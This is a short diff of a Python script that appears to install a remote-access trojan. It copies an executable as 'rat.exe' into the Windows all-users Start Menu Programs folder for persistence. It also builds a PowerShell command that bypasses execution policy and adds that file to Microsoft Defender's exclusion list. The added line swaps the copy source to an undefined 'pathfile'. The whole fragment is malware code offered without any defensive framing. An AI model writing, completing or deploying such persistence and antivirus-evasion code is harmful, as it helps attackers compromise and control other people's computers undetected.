@@ -3,6 +3,7 @@ import shutil
 import sys
 
 source = sys.executable
+source = pathfile
 destination = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\rat.exe"
 
 exclusion = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \'{destination}\'"'
